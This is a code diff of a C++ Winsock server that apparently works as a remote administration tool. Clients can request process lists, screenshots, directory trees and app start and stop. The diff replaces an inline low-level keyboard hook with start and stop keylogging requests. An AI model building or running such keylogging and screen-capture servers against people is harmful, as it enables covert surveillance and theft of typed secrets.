@@ -2,6 +2,7 @@
 
 #include <string.h>
 #include <iostream>
+#include <mutex>
 
 #include "../GlobalConstant.h"
 #include "../Utils/InUtils.h"
@@ -24,31 +25,38 @@ Server::~Server(){
     std::cout << "Server closed." << "\n";
     closesocket(this->listener);
     closesocket(this->disfd);
+    delete this->_keylog;
+    #ifdef _WIN32
+        WSACleanup();
+    #endif
 }
 
 Server::Server(const char* port){
-    WSADATA wsaData;
-    auto wVersionRequested = MAKEWORD(2, 2); // Get version of winsock
-    int retCode = WSAStartup(wVersionRequested, &wsaData);
+    #ifdef _WIN32
+        WSADATA wsaData;
+        auto wVersionRequested = MAKEWORD(2, 2); // Get version of winsock
+        int retCode = WSAStartup(wVersionRequested, &wsaData);
 
-    if (retCode != 0)
-        std::cout << "Startup failed: " << retCode << "\n";
-        
-    std::cout << "Return Code: " << retCode << "\n";
-    std::cout << "Version Used: " << (int) LOBYTE(wsaData.wVersion) << "." << (int) HIBYTE(wsaData.wVersion) << "\n";
-    std::cout << "Version Supported: " << (int) LOBYTE(wsaData.wHighVersion) << "." << (int) HIBYTE(wsaData.wHighVersion) << "\n";
-    std::cout << "Implementation: " << wsaData.szDescription << "\n";
-    std::cout << "System Status: " << wsaData.szSystemStatus << "\n";
-    std::cout << "\n";
+        if (retCode != 0)
+            std::cout << "Startup failed: " << retCode << "\n";
+            
+        std::cout << "Return Code: " << retCode << "\n";
+        std::cout << "Version Used: " << (int) LOBYTE(wsaData.wVersion) << "." << (int) HIBYTE(wsaData.wVersion) << "\n";
+        std::cout << "Version Supported: " << (int) LOBYTE(wsaData.wHighVersion) << "." << (int) HIBYTE(wsaData.wHighVersion) << "\n";
+        std::cout << "Implementation: " << wsaData.szDescription << "\n";
+        std::cout << "System Status: " << wsaData.szSystemStatus << "\n";
+        std::cout << "\n";
 
-    if(LOBYTE(wsaData.wVersion) != LOBYTE(wVersionRequested) || HIBYTE(wsaData.wVersion) != HIBYTE(wVersionRequested)){
-        std::cout << "Supported Version is too low.\n";
-        WSACleanup();
-        exit(0);
-    }
+        if(LOBYTE(wsaData.wVersion) != LOBYTE(wVersionRequested) || HIBYTE(wsaData.wVersion) != HIBYTE(wVersionRequested)){
+            std::cout << "Supported Version is too low.\n";
+            WSACleanup();
+            exit(0);
+        }
 
-    std::cout << "WSAStartup sucess.\n\n";
-        
+        std::cout << "WSAStartup sucess.\n\n";
+    #endif
+    
+    // this->keyLogThread = std::thread(startKeyLogHelper);
     int status;
     int yes = 1;
     addrinfo hints, *res;
@@ -139,7 +147,7 @@ Server::Server(const char* port){
         exit(1);
     }
 
-    this->pfds.emplace_back();
+    this->pfds.push_back(WSAPOLLFD());
     this->pfds.back().fd = this->disfd;
     this->pfds.back().events = POLLIN;
 }
@@ -209,12 +217,14 @@ void Server::start(){
                         responseToClient = this->startApp((char*)requestFromClient.data());
                     else if(requestFromClient.type() == STOP_APP_REQUEST)
                         responseToClient = this->stopApp((char*)requestFromClient.data());
-                    else if (requestFromClient.type() == LIST_PROCESS_REQUEST) 
+                    else if (requestFromClient.type() == LIST_PROC_REQUEST) 
                         responseToClient = this->listProcess();
                     else if (requestFromClient.type() == SCREENSHOT_REQUEST)
                         responseToClient = this->screenShot();
-                    else if(requestFromClient.type() == KEYLOG_REQUEST)
-                        responseToClient = this->keyLog();
+                    else if(requestFromClient.type() == START_KEYLOG_REQUEST)
+                        responseToClient = this->startKeyLog(pfd.fd);
+                    else if(requestFromClient.type() == STOP_KEYLOG_REQUEST)
+                        responseToClient = this->stopKeyLog(pfd.fd);
                     else if (requestFromClient.type() == DIR_TREE_REQUEST)
                         responseToClient = this->dirTree((char*)requestFromClient.data());
                     else {
@@ -225,6 +235,8 @@ void Server::start(){
                     status = sendResponse(pfd.fd, responseToClient, 0);
                     if(status == SOCKET_ERROR)
                         std::cerr << "Can't send response.\n";
+                    if(requestFromClient.type() == STOP_KEYLOG_REQUEST)
+                        closesocket(pfd.fd);
                 }
             }
         }
@@ -288,26 +300,28 @@ Response Server::screenShot(){
     return Response(CMD_RESPONSE_PNG, errCode, buffer.size(), buffer.data());
 }
 
-Response Server::keyLog(){
-    std::cout << "Server: Receive KeyLog instruction.\n";
-    std::cout << "Server: Start KeyLog.\n";
-    // Init hook
-    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
-    if (hHook == NULL){
-        std::cerr << "Error: Failed to set keyboard hook.\n";
-        return Response(CMD_RESPONSE_EMPTY, FAIL_CODE, 0, NULL);
-    }
+Response Server::startKeyLog(int sockfd){
+    std::mutex m;
+    std::lock_guard l(m);
+    keylogfds.push_back(sockfd);
+    std::cout << "Start keylog" << std::endl;
+    this->_keylog = new Keylogger();
+    return Response(CMD_RESPONSE_EMPTY, OK_CODE, 0, NULL);
+}
 
-    // Loop waiting for event
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0) > 0){
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
+Response Server::stopKeyLog(int sockfd){
+    std::mutex m;
+    std::lock_guard l(m);
+    for (int i = 0; i < keylogfds.size(); ++i){
+        if (keylogfds[i] == sockfd)
+        {
+            keylogfds[i] = keylogfds.back();
+            keylogfds.pop_back();
+            break;
+        }
     }
-    
-    // Destroy hook
-    UnhookWindowsHookEx(hHook);
-    return Response(CMD_RESPONSE_EMPTY, OK_CODE, 0, NULL); 
+    std::cout << "Stop keylog" << std::endl;
+    return Response(CMD_RESPONSE_EMPTY, OK_CODE, 0, NULL);
 }
     
 Response Server::dirTree(const char* pathName){
